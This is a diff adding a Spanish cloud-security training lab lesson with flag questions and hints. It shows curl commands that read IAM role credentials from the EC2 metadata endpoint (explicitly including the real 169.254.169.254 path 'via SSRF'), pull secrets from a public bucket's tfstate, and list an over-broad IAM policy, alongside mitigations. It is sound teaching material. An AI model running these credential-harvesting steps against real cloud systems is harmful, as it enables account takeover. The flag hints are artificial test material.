@@ -1,0 +1,79 @@
+---
+index: 4
+title: "Lab: roba la nube por IMDS, S3 e IAM"
+questions:
+  - id: containers-y-cloud-t04-q01
+    prompt: "El workload expone su metadata. Consigue las credenciales del rol por IMDS y envía la flag."
+    hint: "curl http://127.0.0.1:18115/aws/latest/meta-data/iam/security-credentials/ec2-web-role — la ruta real es http://169.254.169.254/..."
+    kind: flag
+  - id: containers-y-cloud-t04-q02
+    prompt: "Uno de los buckets es público. Saca el terraform.tfstate (o secrets.env) y envía la flag que contienen."
+    hint: "curl http://127.0.0.1:18115/s3/buckets → el público es corp-internal-tools → /s3/corp-internal-tools/terraform.tfstate"
+    kind: flag
+  - id: containers-y-cloud-t04-q03
+    prompt: "Audita /iam/policies: hay una con Action * sobre Resource *. Envía su flag."
+    hint: "curl http://127.0.0.1:18115/iam/policies"
+    kind: flag
+---
+
+## El trio pecaminoso de las nubes
+
+Levanta el segundo lab de la room (sus comandos están en su carpeta):
+
+```bash
+cd labs/cloud-iam-sim && cp flags.env.example flags.env
+docker compose --env-file flags.env up -d
+# http://127.0.0.1:18115
+```
+
+### 1. IMDS: el endpoint que regala el rol
+
+Cada instancia EC2 expone `http://169.254.169.254/latest/meta-data/`
+(link-local, SIN autenticación). Ahí viven las credenciales temporales
+del rol de la instancia. Cualquier SSRF en la app las recoge:
+
+```bash
+# En AWS real (desde la instancia o vía SSRF):
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-web-role
+
+# En el lab (mismas rutas bajo /aws):
+curl http://127.0.0.1:18115/aws/latest/meta-data/iam/security-credentials/ec2-web-role
+```
+
+Fíjate en la `Expiration` del lab: 2036. El Capital One breach de 2019
+fue EXACTAMENTE esto — un WAF con SSRF + IMDSv1 + rol sobredimensionado.
+
+**Mitigación**: IMDSv2 con token obligatorio (PUT hop-limit 1),
+y roles mínimos por servicio.
+
+### 2. El bucket público
+
+```bash
+curl -s http://127.0.0.1:18115/s3/buckets | jq '.buckets[] | select(.public)'
+curl -s http://127.0.0.1:18115/s3/corp-internal-tools/terraform.tfstate | jq .
+```
+
+El `tfstate` lleva secret access keys y contraseñas en claro (terraform
+los cifra solo si configuras `encrypted: true` — nadie lo hace a tiempo).
+Bucket públicos con tfstate/logs/backups es el hallazgo #1 de cualquier
+cloud pentest.
+
+### 3. El wildcard que lo permite todo
+
+```bash
+curl -s http://127.0.0.1:18115/iam/policies | jq .
+```
+
+`"Action": "*"` sobre `"Resource": "*"` pegado a un instance role:
+encadena con las creds del IMDS y tienes la cuenta entera (aws s3 ls
+sobre TODO, iam createUser, etc.). El principio de mínimo privilegio no
+es burocracia: es el muro que convierte un SSRF menor en un incidente
+de "tenemos que rotar la cuenta".
+
+## El encadenamiento real
+
+SSRF (web) → IMDS (creds) → IAM (wildcard) → S3 (todos los datos). Cuatro
+fallos encadenables que en conjunto son el patrón de brecha cloud más
+común desde 2019. Corta CUALQUIER eslabón y el ataque muere: por eso se
+parchean los cuatro, no solo "el bug del SSRF".
